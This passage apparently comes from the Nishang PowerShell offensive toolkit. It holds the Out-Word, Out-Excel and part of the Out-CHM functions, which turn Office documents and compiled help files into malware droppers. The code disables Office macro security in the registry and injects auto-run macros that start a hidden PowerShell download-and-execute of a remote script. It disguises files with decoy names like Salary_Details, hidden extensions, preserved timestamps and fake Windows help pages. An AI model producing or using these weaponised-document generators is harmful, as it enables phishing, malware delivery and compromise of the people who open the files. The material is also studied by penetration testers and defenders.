            else 
            {
                Start-Sleep -Milli $TimeOut
                if($client.Connected) 
                {
                    Write-Host "Connected to port $ports" -ForegroundColor Green
                }
            }
            $client.Close()
        }catch { Write-Error $Error[0]}
    }        
	Write-Host "Data sent to all ports"
}

##################################Client Side Attack functions######################################
#######################################Out-Word#############################################
function Out-Word
{
<#
.SYNOPSIS
Nishang Script which can generate and "infect" existing word files with an auto executable macro. 

.DESCRIPTION
The script can create as well as "infect" existing word files with an auto executable macro. Powershell payloads
could be exeucted using the genereated files. If a folder is passed to the script it can insert macro in all existing word
files in the folder. With the Recurse switch, sub-folders can also be included. 
For existing files, a new macro enabled doc file is generated from a docx file and for existing .doc files, the macro code is inserted.
LastWriteTime of the docx file is set to the newly generated doc file. If the RemoveDocx switch is enabled, the 
original docx is removed and the data in it is lost.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER WordFileDir
The directory which contains MS Word files which are to be "infected".

.PARAMETER OutputFile
The path for the output Word file. Default is Salary_Details.doc in the current directory.

.PARAMETER Recurse
Recursively look for Word files in the WordFileDir

.PARAMETER RemoveDocx
When using the WordFileDir to "infect" files in a directory, remove the original ones after creating the infected ones.

.PARAMETER RemainSafe
Use this switch to turn on Macro Security on your machine after using Out-Word.

.EXAMPLE
PS > Out-Word -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"

Use above command to provide your own payload to be executed from macro. A file named "Salary_Details.doc" would be generated
in the current directory.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1

Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
named "Salary_Details.doc" would be generated in user's temp directory.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -Arguments Evil

Use above when you want to use the default payload, which is a powershell download and execute one-liner.
The Arugment parameter allows to pass arguments to the downloaded script.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -OutputFile C:\docfiles\Generated.doc

In above, the output file would be saved to the given path.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -WordFileDir C:\docfiles\

In above, in the C:\docfiles directory, macro enabled .doc files would be created for all the .docx files, with the same name
and same Last MOdified Time.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -WordFileDir C:\docfiles\ -Recurse

The above command would search recursively for .docx files in C:\docfiles.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -WordFileDir C:\docfiles\ -Recurse -RemoveDocx

The above command would search recursively for .docx files in C:\docfiles, generate macro enabled .doc files and
delete the original files.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -RemainSafe

Out-Word turns off Macro Security. Use -RemainSafe to turn it back on.


.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
#>

    [CmdletBinding()] Param(
        
        [Parameter(Position=0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position=1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position=2, Mandatory = $False)]
        [String]
        $Arguments,
        
        [Parameter(Position=3, Mandatory = $False)]
        [String]
        $WordFileDir,
        
        [Parameter(Position=4, Mandatory = $False)]
        [String]
        $OutputFile="$pwd\Salary_Details.doc",

        
        [Parameter(Position=5, Mandatory = $False)]
        [Switch]
        $Recurse,
        
        [Parameter(Position=6, Mandatory = $False)]
        [Switch]
        $RemoveDocx,

        [Parameter(Position=7, Mandatory = $False)]
        [Switch]
        $RemainSafe
    )
    
    $Word = New-Object -ComObject Word.Application
    $WordVersion = $Word.Version

    #Check for Office 2007 or Office 2003
    if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
    {
        $Word.DisplayAlerts = $False
    }
    else
    {
        $Word.DisplayAlerts = "wdAlertsNone"
    }    
    #Turn off Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 1 -PropertyType DWORD -Force | Out-Null

    if(!$Payload)
    {
        $Payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }
    #Macro Code
    #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
    $code = @"
    Sub Document_Open()
    Execute

    End Sub


         Public Function Execute() As Variant
            Const HIDDEN_WINDOW = 0
            strComputer = "."
            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
            Set objConfig = objStartup.SpawnInstance_
            objConfig.ShowWindow = HIDDEN_WINDOW
            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
            objProcess.Create "$Payload", Null, objConfig, intProcessID
         End Function
"@

  
    if ($WordFileDir)
    {
        $WordFiles = Get-ChildItem $WordFileDir\* -Include *.doc,*.docx
        if ($Recurse -eq $True)
        {
            $WordFiles = Get-ChildItem -Recurse $WordFileDir\* -Include *.doc,*.docx
        }
        ForEach ($WordFile in $WordFiles)
        {
            $Word = New-Object -ComObject Word.Application
            $Word.DisplayAlerts = $False
            $Doc = $Word.Documents.Open($WordFile.FullName)
            $DocModule = $Doc.VBProject.VBComponents.Item(1)
            $DocModule.CodeModule.AddFromString($code)
            if ($WordFile.Extension -eq ".doc")
            {
                $Savepath = $WordFile.FullName
            }
            $Savepath = $WordFile.DirectoryName + "\" + $Wordfile.BaseName + ".doc"
            #Append .doc to the original file name if file extensions are hidden for known file types.
            if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced).HideFileExt -eq "1")
            {
                $Savepath = $WordFile.FullName + ".doc"
            }
            if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
            {
                $Doc.Saveas($SavePath, 0)
            }
            else
            {
                $Doc.Saveas([ref]$SavePath, 0)
            } 
            Write-Output "Saved to file $SavePath"
            $Doc.Close()
            $LastModifyTime = $WordFile.LastWriteTime
            $FinalDoc = Get-ChildItem $Savepath
            $FinalDoc.LastWriteTime = $LastModifyTime
            if ($RemoveDocx -eq $True)
            {
                Write-Output "Deleting $($WordFile.FullName)"
                Remove-Item -Path $WordFile.FullName
            }
            $Word.quit()
            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word)
        }
    }
    else
    {
        $Doc = $Word.documents.add()
        $DocModule = $Doc.VBProject.VBComponents.Item(1)
        $DocModule.CodeModule.AddFromString($code)
        if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
        {
            $Doc.Saveas($OutputFile, 0)
        }
        else
        {
            $Doc.Saveas([ref]$OutputFile, [ref]0)
        } 
        Write-Output "Saved to file $OutputFile"
        $Doc.Close()
        $Word.quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word)
    }

    if ($RemainSafe -eq $True)
    {
        #Turn on Macro Security
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 0 -Force | Out-Null
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 0 -Force | Out-Null
    }
}

#######################################Out-Excel#############################################

function Out-Excel
{

<#
.SYNOPSIS
Nishang Script which can generate and "infect" existing excel files with an auto executable macro. 

.DESCRIPTION
The script can create as well as "infect" existing excel files with an auto executable macro. Powershell payloads
could be exeucted using the genereated files. If a folder is passed to the script it can insert macro in all existing excrl
files in the folder. With the Recurse switch, sub-folders can also be included. 
For existing files, a new macro enabled xls file is generated from a xlsx file and for existing .xls files, the macro code is inserted.
LastWriteTime of the xlsx file is set to the newly generated xls file. If the RemoveXlsx switch is enabled, the 
original xlsx is removed and the data in it is lost.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER ExcelFileDir
The directory which contains MS Excel files which are to be "infected".

.PARAMETER OutputFile
The path for the output Excel file. Default is Salary_Details.xls in the current directory.

.PARAMETER Recurse
Recursively look for Excel files in the ExcelFileDir

.PARAMETER RemoveXlsx
When using the ExcelFileDir to "infect" files in a directory, remove the original ones after creating the infected ones.

.PARAMETER RemainSafe
Use this switch to turn on Macro Security on your machine after using Out-Excel.

.EXAMPLE
PS > Out-Excel -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"

Use above command to provide your own payload to be executed from macro. A file named "Salary_Details.xls" would be generated
in user's temp directory.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1

Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
named "Salary_Details.xls" would be generated in user's temp directory.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -Arguments

Use above when you want to use the default payload, which is a powershell download and execute one-liner.
The Arugment parameter allows to pass arguments to the downloaded script.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -OutputFile C:\xlsfiles\Generated.xls

In above, the output file would be saved to the given path.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\xlsfiles\

In above, in the C:\xlsfiles directory, macro enabled .xls files would be created for all the .xlsx files, with the same name
and same Last MOdified Time.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\xlsfiles\ -Recurse

The above command would search recursively for .xlsx files in C:\xlsfiles.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\xlsfiles\ -Recurse -RemoveXlsx

The above command would search recursively for .xlsx files in C:\xlsfiles, generate macro enabled .xls files and
delete the original files.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -RemainSafe

Out-Excel turns off Macro Security. Use -RemainSafe to turn it back on.


.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
#>


    [CmdletBinding()] Param(
        
        [Parameter(Position=0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position=1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position=2, Mandatory = $False)]
        [String]
        $Arguments,
        
        [Parameter(Position=3, Mandatory = $False)]
        [String]
        $ExcelFileDir,
        
        [Parameter(Position=4, Mandatory = $False)]
        [String]
        $OutputFile="$pwd\Salary_Details.xls",

        
        [Parameter(Position=5, Mandatory = $False)]
        [Switch]
        $Recurse,
        
        [Parameter(Position=6, Mandatory = $False)]
        [Switch]
        $RemoveXlsx,

        [Parameter(Position=7, Mandatory = $False)]
        [Switch]
        $RemainSafe
    )
    
    #http://stackoverflow.com/questions/21278760/how-to-add-vba-code-in-excel-worksheet-in-powershell
    $Excel = New-Object -ComObject Excel.Application
    $ExcelVersion = $Excel.Version
    #Check for Office 2007 or Office 2003
    if (($ExcelVersion -eq "12.0") -or  ($ExcelVersion -eq "11.0"))
    {
        $Excel.DisplayAlerts = $False
    }
    else
    {
        $Excel.DisplayAlerts = "wdAlertsNone"
    }    
    #Turn off Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    if(!$Payload)
    {
        $Payload = "powershell.exe -ExecutionPolicy Bypass -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }
    #Macro Code
    #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
    $CodeAuto = @"
    Sub Auto_Open()
    Execute

    End Sub


         Public Function Execute() As Variant
            Const HIDDEN_WINDOW = 0
            strComputer = "."
            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
            Set objConfig = objStartup.SpawnInstance_
            objConfig.ShowWindow = HIDDEN_WINDOW
            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
            objProcess.Create "$Payload", Null, objConfig, intProcessID
         End Function
"@

    $CodeWorkbook = @"
    Sub Workbook_Open()
    Execute

    End Sub


         Public Function Execute() As Variant
            Const HIDDEN_WINDOW = 0
            strComputer = "."
            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
            Set objConfig = objStartup.SpawnInstance_
            objConfig.ShowWindow = HIDDEN_WINDOW
            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
            objProcess.Create "$Payload", Null, objConfig, intProcessID
         End Function
"@

  
    if ($ExcelFileDir)
    {
        $ExcelFiles = Get-ChildItem $ExcelFileDir *.xlsx
        if ($Recurse -eq $True)
        {
            $ExcelFiles = Get-ChildItem -Recurse $ExcelFileDir *.xlsx
        }
        ForEach ($ExcelFile in $ExcelFiles)
        {
            $Excel = New-Object -ComObject Excel.Application
            $Excel.DisplayAlerts = $False
            $WorkBook = $Excel.Workbooks.Open($ExcelFile.FullName)
            $ExcelModule = $WorkBook.VBProject.VBComponents.Item(1)
            $ExcelModule.CodeModule.AddFromString($CodeWorkbook)
            $Savepath = $ExcelFile.DirectoryName + "\" + $ExcelFile.BaseName + ".xls"
            #Append .xls to the original file name if file extensions are hidden for known file types.
            if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced).HideFileExt -eq "1")
            {
                $Savepath = $ExcelFile.FullName + ".xls"
            }
            $WorkBook.Saveas($SavePath, 18)
            Write-Output "Saved to file $SavePath"
            $Excel.Workbooks.Close()
            $LastModifyTime = $ExcelFile.LastWriteTime
            $FinalDoc = Get-ChildItem $Savepath
            $FinalDoc.LastWriteTime = $LastModifyTime
            if ($RemoveXlsx -eq $True)
            {
                Write-Output "Deleting $($ExcelFile.FullName)"
                Remove-Item -Path $ExcelFile.FullName
            }
            $Excel.Quit()
            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel)
        }
    }
    else
    {
        $WorkBook = $Excel.Workbooks.Add(1)
        $WorkSheet=$WorkBook.WorkSheets.item(1)
        $ExcelModule = $WorkBook.VBProject.VBComponents.Add(1)
        $ExcelModule.CodeModule.AddFromString($CodeAuto)
        $WorkBook.SaveAs($OutputFile, 18)
        Write-Output "Saved to file $OutputFile"
        $Excel.Workbooks.Close()
        $Excel.Quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel)
    }

    if ($RemainSafe -eq $True)
    {
        #Turn on Macro Security
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name AccessVBOM -Value 0 -Force | Out-Null
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name VBAWarnings -Value 0 -Force | Out-Null
    }
}

#######################################Out-CHM#############################################


function Out-CHM
{

<#
.SYNOPSIS
Nishang script useful for creating Compiled HTML Help file (.CHM) which could be used to run PowerShell commands and scripts.

.DESCRIPTION
The script generates a CHM file which needs to be sent to a target.
You must have hhc.exe (HTML Help Workshop) on your machine to use this script.
HTML Help Workshop is a free Microsoft Tool and could be downloaded from below link:
http://www.microsoft.com/en-us/download/details.aspx?id=21138

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER OutputPath
Path to the directory where the files would be saved. Default is the current directory.

.EXAMPLE
PS > Out-CHM -Payload "Get-Process" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Above command would execute Get-Process on the target machine when the CHM file is opened.

.EXAMPLE
PS > Out-CHM -PayloadURL http://192.168.254.1/Get-Information.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Use above command to generate CHM file which download and execute the given powershell script in memory on target.

.EXAMPLE
PS > Out-CHM -Payload "-EncodedCommand <>" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Use above command to generate CHM file which executes the encoded command/script.
Use Invoke-Encode from Nishang to encode the command or script.

.EXAMPLE
PS > Out-CHM -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Use above command to pass an argument to the powershell script/module.

.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang

.Notes
Based on the work mentioned in this tweet by @ithurricanept
https://twitter.com/ithurricanept/status/534993743196090368
#>



    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $HHCPath,

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $OutputPath="$pwd"
    )

    #Check if the payload has been provided by the user
    if(!$Payload)
    {
        $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }    

    #Create the table of contents for the CHM
    $CHMTableOfContents = @"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<!-- Sitemap 1.0 -->
</HEAD><BODY>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 Advanced IP Settings Tab">
      <param name="Local" value="doc.htm">
  </OBJECT>
  </UL>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 Advanced WINS Tab">
      <param name="Local" value="doc1.htm">
  </OBJECT>
  </UL>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 Alternate Configuration Tab">
      <param name="Local" value="doc.htm">
  </OBJECT>
  </UL>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 and IPv6 Advanced DNS Tab">
      <param name="Local" value="doc1.htm">
  </OBJECT>
  </UL>
</BODY>
</HTML>
"@

    #Create the Project file for the CHM
    $CHMProject = @"
[OPTIONS]
Contents file=$OutputPath\doc.hhc
[FILES]
$OutputPath\doc.htm
$OutputPath\doc1.htm
"@
    #Create the HTM files, the first one controls the payload execution.
    $CHMHTML1 = @"
<HTML>
<TITLE>Check for Windows updates from Command Line</TITLE>
<HEAD>
</HEAD>
<BODY>

<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=",cmd.exe,/c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile $Payload">
 <PARAM name="Item2" value="273,1,1">
</OBJECT>

<SCRIPT>
x.Click();
</SCRIPT>

<html DIR="LTR" xmlns:MSHelp="http://msdn.microsoft.com/mshelp" xmlns:ddue="http://ddue.schemas.microsoft.com/authoring/2003/5" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:tool="http://www.microsoft.com/tooltip"><head><META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=Windows-1252"></META><META NAME="save" CONTENT="history"></META><title>IPv4 Advanced IP Settings Tab</title><link rel="stylesheet" type="text/css" href="../local/Classic.css"></link><script src="../local/script.js"></script></head><body><div id="header"><h1>IPv4 Advanced IP Settings Tab</h1></div><div id="mainSection"><div id="mainBody"><p class="runningHeader"></p>
<p>You can use the settings on this tab for this network connection only if you are not using the <b>Obtain an IP address automatically</b> on the <b>General</b> tab.</p>

<p><b>IP addresses</b> lists additional Internet Protocol version 4 (IPv4) addresses that can be assigned to this network connection. There is no limit to the number of IP addresses that can be configured. This setting is useful if this computer connects to a single physical network but requires advanced IP addressing because of either of the following reasons:</p>

<ul><li class="unordered">
A single logical IP network is in use and this computer needs to use more than one IP address to communicate on that network.<br /><br />
</li><li class="unordered">
Multiple logical IP networks are in use and this computer needs a different IP address to communicate with each of the different logical IP networks.<br /><br />
</li></ul>

<p><b>Default gateways</b> lists IP addresses for additional default gateways that can be used by this network connection. A default gateway is a local IP router that is used to forward packets to destinations beyond the local network. </p>

<p><b>Automatic metric</b> specifies whether TCP/IP automatically calculates a value for an interface metric that is based on the speed of the interface. The highest-speed interface has the lowest interface metric value. </p>

<p><b>Interface metric</b> provides a location for you to type a value for the interface metric for this network connection. A lower value for the interface metric indicates a higher priority for use of this interface. </p>
<h1 class="heading">Procedures</h1><div id="sectionSection0" class="section"><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To configure additional IP addresses for this connection</b></td></tr></table><ddue:steps><ol class="ordered" xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">In <b>IP Addresses</b>, click <b>Add</b>.<b> </b></p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Type an IP address in <b>IP address</b>. </p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Type a subnet mask in <b>Subnet mask</b>, and then click <b>Add</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Repeat steps 1 through 3 for each IP address you want to add, and then click <b>OK</b>.</p>
</content></li></ol></ddue:steps>

<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To configure additional default gateways for this connection</b></td></tr></table><ddue:steps><ol class="ordered" xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">On the <b>IP Settings</b> tab, in <b>Default gateways</b>, click <b>Add</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">In <b>TCP/IP Gateway Address</b>, type the IP address of the default gateway in <b>Gateway</b>. To manually configure a default route metric, clear the <b>Automatic metric </b>check box and type a metric in <b>Metric</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Click <b>Add</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Repeat steps 1 through 3 for each default gateway you want to add, and then click <b>OK</b>.</p>
</content></li></ol></ddue:steps>

<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To configure a custom metric for this connection</b></td></tr></table><ddue:steps><ul xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Clear the <b>Automatic metric</b> check box, and then type a metric value in <b>Interface metric</b>.</p>
</content></li></ul></ddue:steps>
</content></div><h1 class="heading">Additional references</h1><div id="sectionSection1" class="section"><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">For updated detailed IT pro information about TCP/IP versions 4 and 6, see <a href="http://go.microsoft.com/fwlink/?LinkID=117437" alt="" target="_blank"><linkText xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">http://go.microsoft.com/fwlink/?LinkID=117437</linkText></a> and <a href="http://go.microsoft.com/fwlink/?LinkID=71543" alt="" target="_blank"><linkText xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">http://go.microsoft.com/fwlink/?LinkID=71543</linkText></a>.</p>
</content></div></div><hr /><p /></div></body></html>
</BODY>
</HTML>
"@
    #Second help topic to make the file look authentic.
    $CHMHTML2 = @"
<html DIR="LTR" xmlns:MSHelp="http://msdn.microsoft.com/mshelp" xmlns:ddue="http://ddue.schemas.microsoft.com/authoring/2003/5" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:tool="http://www.microsoft.com/tooltip"><head><META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=Windows-1252"></META><META NAME="save" CONTENT="history"></META><title>IPv4 Advanced WINS Tab</title><link rel="stylesheet" type="text/css" href="../local/Classic.css"></link><script src="../local/script.js"></script></head><body><div id="header"><h1>IPv4 Advanced WINS Tab</h1></div><div id="mainSection"><div id="mainBody"><p class="runningHeader"></p>
<p>You can use the settings on this tab for this network connection only if you are not using the <b>Obtain an IP address automatically</b> on the <b>General</b> tab.</p>

<p><b>WINS addresses, in order of use</b> lists the Windows Internet Name Service (WINS) servers that TCP/IP queries to resolve network basic input/output system (NetBIOS) names. WINS servers are queried in the order in which they are listed here.</p>

<p><b>Enable LMHOSTS lookup</b> specifies whether an Lmhosts file is used to resolve the NetBIOS names of remote computers to an IP address. </p>

<p>Click <b>Import LMHOSTS</b> to import a file into the Lmhosts file. The Lmhosts file is located in the %SystemRoot%\System32\Drivers\Etc folder on a Windows-based computer. There is also a sample Lmhosts file (Lmhosts.sam) in this folder. When you import LMHOSTS from a file, the original Lmhosts file is not appended to, but is overwritten by the new file.</p>

<p><b>NetBIOS setting</b> specifies whether this network connection obtains the setting to enable or disable NetBIOS over TCP/IP (NetBT) from a Dynamic Host Configuration Protocol (DHCP) server. </p>

<p>When an IP address is automatically obtained, the <b>Default</b> option is selected so that this computer uses the NetBT setting as optionally provided by the DHCP server when this computer obtains an IP address and configuration lease. If the Disable NetBIOS over TCP/IP (NetBT) DHCP option is provided by the DHCP server, the value of the option determines whether NetBT is enabled or disabled. If the Disable NetBIOS over TCP/IP (NetBT) DHCP option is not provided by the DHCP server, NetBT is enabled.</p>

<p>If you are manually configuring an IP address, selecting <b>Enable NetBIOS over TCP/IP</b> enables NetBT. This option is not available for dial-up connections.</p>
<h1 class="heading">Procedures</h1><div id="sectionSection0" class="section"><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To configure advanced WINS properties</b></td></tr></table><ddue:steps><ol class="ordered" xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">In <b>WINS addresses, in order of use</b>, click <b>Add</b>, type the address of the WINS server, and then click <b>Add</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Repeat step 1 for each WINS server IP address you want to add, and then click <b>OK</b>.</p>
</content></li></ol></ddue:steps>

<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To enable the use of the Lmhosts file to resolve remote NetBIOS names</b></td></tr></table><ddue:steps><ul xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Select the <b>Enable LMHOSTS lookup</b> check box. This option is enabled by default.</p>
</content></li></ul></ddue:steps>

<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To specify the location of the file that you want to import into the Lmhosts file</b></td></tr></table><ddue:steps><ul xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Click <b>Import LMHOSTS</b>, and then select the file in the <b>Open</b> dialog box.</p>
</content></li></ul></ddue:steps>

<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To enable or disable NetBIOS over TCP/IP</b></td></tr></table><ddue:steps><ul xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">To enable the use of NetBIOS over TCP/IP, click <b>Enable NetBIOS over TCP/IP</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">To disable the use of NetBIOS over TCP/IP, click <b>Disable NetBIOS over TCP/IP</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">To have the DHCP server determine whether NetBIOS over TCP/IP is enabled or disabled, click <b>Default</b>.</p>
</content></li></ul></ddue:steps>
</content></div><h1 class="heading">Additional references</h1><div id="sectionSection1" class="section"><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
